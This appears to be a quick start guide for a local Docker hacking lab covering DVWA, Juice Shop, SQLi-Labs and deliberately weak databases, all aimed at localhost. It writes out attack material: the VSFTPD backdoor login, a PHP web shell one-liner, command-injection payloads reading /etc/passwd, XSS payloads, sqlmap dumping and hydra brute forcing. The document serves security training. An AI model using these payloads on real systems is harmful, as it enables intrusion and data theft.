# Quick Start Guide - Hacking Lab

## 1. Initial Setup

```bash
# Make sure the script is executable (already done)
chmod +x lab.sh

# Check system requirements
./lab.sh check

# Start the lab
./lab.sh start
```

## 2. Verify Lab is Running

```bash
# Check all containers
./lab.sh status

# List all available services
./lab.sh urls

# Check common credentials
./lab.sh credentials
```

## 3. Quick Wins - Easy Vulnerabilities to Start With

### 3.1 VSFTPD Backdoor (Beginner)
```bash
telnet localhost 21
# When you see the banner, type:
User: smile:)
# Password: smile
# You should get a shell with root access!
```

### 3.2 DVWA - Damn Vulnerable Web App (Beginner)
```bash
# Visit in browser: http://localhost:8080
# Default login: admin:password
# Set security level to "low" for easiest exploitation
# Try the SQL Injection module first
```

### 3.3 Juice Shop (Beginner-Intermediate)
```bash
# Visit: http://localhost:3000
# No login required
# Try the score board and challenges
# Great for learning modern web vulnerabilities
```

### 3.4 MySQL Weak Authentication (Beginner)
```bash
mysql -h localhost -P 3306 -u root -p
# Password: root
# Once connected:
SHOW DATABASES;
USE testdb;
SHOW TABLES;
SELECT * FROM users;
```

### 3.5 Redis No Authentication (Beginner)
```bash
redis-cli -h localhost -p 6379
# No password required
# Try these commands:
INFO
KEYS *
CONFIG GET *
FLUSHALL  # Be careful with this!
```

### 3.6 ElasticSearch No Auth (Beginner)
```bash
curl http://localhost:9200
curl http://localhost:9200/_cat/indices?v
curl http://localhost:9200/_aliases?pretty=true
```

### 3.7 SQLi-Labs (Beginner-Intermediate)
```bash
# Visit: http://localhost:8091
# No login required
# Click "Setup/reset Database" first
# Start with Lesson 1 and progress through 25+ SQLi challenges
# Perfect for mastering SQL injection techniques
```

### 3.8 OWASP WrongSecrets (Beginner)
```bash
# Visit: http://localhost:8099
# Learn secrets management vulnerabilities
# Find hardcoded secrets, exposed credentials
# Great for DevSecOps and secure coding practices
```

### 3.9 Pixi - XSS Practice (Beginner)
```bash
# Visit: http://localhost:8094
# Dedicated XSS training platform
# Practice reflected, stored, and DOM XSS
# Learn payload crafting and filter bypasses
```

## 4. Network Service Scanning

### 4.1 Port Scan with Nmap
```bash
# Scan all ports on localhost
nmap -sV -sC localhost

# Scan specific port ranges
nmap -p 21,22,80,3306 localhost

# Comprehensive scan
nmap -T4 -A -v localhost

# Scan with all scripts
nmap -sC --script=vuln localhost
```

### 4.2 Service Enumeration
```bash
# Enumerate FTP
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-proftpd-backdoor localhost

# Enumerate SMB
nmap -p 445 --script=smb-enum-shares,smb-enum-users localhost

# Enumerate SSH
nmap -p 2222 --script=ssh2-enum-algos,ssh-auth-methods localhost
```

## 5. Web Application Testing

### 5.1 Web Vulnerability Scanning
```bash
# Nikto scanner
nikto -h http://localhost:8080

# Directory brute-forcing
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt

# Alternative: dirb
dirb http://localhost:8080
```

### 5.2 SQL Injection Testing
```bash
# SQLMap on DVWA
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=your_session_id" \
  --dbs

# Enumerate tables
sqlmap -u [URL] --cookie="[COOKIE]" -D dvwa --tables

# Dump data
sqlmap -u [URL] --cookie="[COOKIE]" -D dvwa -T users --dump
```

### 5.3 OWASP ZAP Setup
```bash
# Start ZAP
zap.sh &

# In ZAP:
# 1. Add http://localhost:8080 as target
# 2. Spider the application
# 3. Active scan
# 4. Review alerts
```

## 6. Password Cracking

### 6.1 Hydra - Online Password Cracking
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://localhost:2222

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://localhost

# Web form brute force
hydra -L users.txt -P passwords.txt localhost http-post-form="/login:username=^USER^&password=^PASS^:F=failed"
```

### 6.2 John the Ripper - Offline Password Cracking
```bash
# If you obtain a hash file from a system
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt
```

## 7. CMS Exploitation

### 7.1 WordPress
```bash
# Version detection
curl -I http://localhost:8084

# WPScan
wpscan --url http://localhost:8084 --enumerate u
wpscan --url http://localhost:8084 --enumerate p
wpscan --url http://localhost:8084 --password-attack wp-login --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

### 7.2 Joomla
```bash
# Admin panel: http://localhost:8085/administrator/
# Default: admin:admin

# Enumerate components
curl http://localhost:8085/components/com_examples/
```

## 8. Manual Web Testing

### 8.1 XSS Testing
```bash
# Test stored XSS in DVWA (low security)
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Test reflected XSS
# Input in search boxes, forms, URL parameters
```

### 8.2 File Upload Testing
```bash
# In DVWA file upload:
# 1. Create a PHP web shell: echo '<?php system($_GET["cmd"]); ?>' > shell.php
# 2. Upload it (if low security, bypass filters)
# 3. Access at: http://localhost:8080/hackable/uploads/shell.php?cmd=ls
```

### 8.3 Command Injection
```bash
# In DVWA command execution:
# Try these payloads:
127.0.0.1; ls
127.0.0.1 && ls
127.0.0.1 | cat /etc/passwd
127.0.0.1; whoami
```

## 9. Container Access

```bash
# Get shell into any container
./lab.sh shell dvwa
./lab.sh shell mysql_weak

# Once inside, explore:
ls -la
cat /etc/passwd
ps aux
netstat -tulpn
env
```

## 10. Practice Scenarios

### Scenario 1: Web App Pentest (Easy)
```bash
1. Start lab: ./lab.sh start
2. Access DVWA: http://localhost:8080
3. Login: admin:password
4. Set security to "low"
5. Complete all modules:
   - SQL Injection
   - XSS (Reflected)
   - Command Injection
   - File Upload
```

### Scenario 2: Network Penetration (Medium)
```bash
1. Scan all ports: nmap -sV localhost
2. Find VSFTPD on port 21
3. Exploit backdoor: telnet localhost 21
4. Use credentials: smile:) / smile
5. Get root shell
6. Try other services: SMB, SSH, FTP
```

### Scenario 3: Database Attack (Easy-Medium)
```bash
1. Access MySQL: mysql -h localhost -P 3306 -u root -p
2. Password: root
3. Explore databases
4. Try MySQL on DVWA backend
5. Attempt SQL injection to extract data
```

### Scenario 4: Full Penetration Test (Hard)
```bash
1. Full reconnaissance: nmap -A localhost
2. Web app scanning: nikto -h http://localhost:8080
3. Enumerate all services
4. Exploit each vulnerability found
5. Gain access to containers
6. Privilege escalation inside containers
7. Document findings
```

## 11. Useful Wordlists

```bash
# Location on Kali
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/seclists/

# Create custom wordlists
echo -e "admin\nadministrator\nroot\nuser" > users.txt
echo -e "password\n123456\nadmin\nroot" > passwords.txt
```

## 12. Documentation & Reporting

```bash
# Create a lab report
mkdir -p ~/lab-reports
cd ~/lab-reports

# Start a report for today
echo "# Hacking Lab Report - $(date)" > report-$(date +%Y%m%d).md

# Add findings as you go
echo "## Vulnerability Found" >> report-$(date +%Y%m%d).md
echo "- Service: DVWA" >> report-$(date +%Y%m%d).md
echo "- Type: SQL Injection" >> report-$(date +%Y%m%d).md
echo "- Severity: High" >> report-$(date +%Y%m%d).md
```

## 13. Cleanup

```bash
# Stop all services
./lab.sh stop

# Stop and remove everything (including data)
./lab.sh clean

# View logs before stopping
./lab.sh logs dvwa
```

## 14. Common Issues & Solutions

### Issue: Port Already in Use
```bash
# Find what's using the port
lsof -i :8080

# Kill the process or change port in docker-compose.yml
```

### Issue: Container Won't Start
```bash
# Check logs
./lab.sh logs [service_name]

# Restart service
./lab.sh restart [service_name]
```

### Issue: Out of Memory
```bash
# Stop some services
docker-compose stop jenkins grafana elasticsearch

# Or increase Docker memory in Docker Desktop settings
```

## 15. Learning Path

### Week 1: Basics
- Day 1-2: Reconnaissance with Nmap
- Day 3-4: Web app testing (DVWA, bWAPP)
- Day 5-7: Network services (FTP, SSH, Telnet)

### Week 2: Intermediate
- Day 1-3: SQL Injection with SQLMap
- Day 4-5: XSS and CSRF
- Day 6-7: File upload and command injection

### Week 3: Advanced
- Day 1-3: Database exploitation
- Day 4-5: CMS exploitation (WordPress, Joomla)
- Day 6-7: Privilege escalation

### Week 4: Full Penetration Test
- Day 1-2: Full reconnaissance
- Day 3-4: Vulnerability assessment
- Day 5-6: Exploitation
- Day 7: Reporting and documentation

## 16. Next Steps

1. **Online Platforms**: Try HackTheBox, TryHackMe, HackTheBox
2. **Certifications**: eJPT, OSCP, CEH
3. **Practice CTFs**: Participate in online CTF competitions
4. **Read Books**: "Web Application Hacker's Handbook", "Penetration Testing: A Hands-On Introduction"

## Remember
- Always document your findings
- Understand the vulnerability, don't just run tools
- Try multiple approaches
- Learn from failures
- Practice regularly

Good luck and happy ethical hacking!
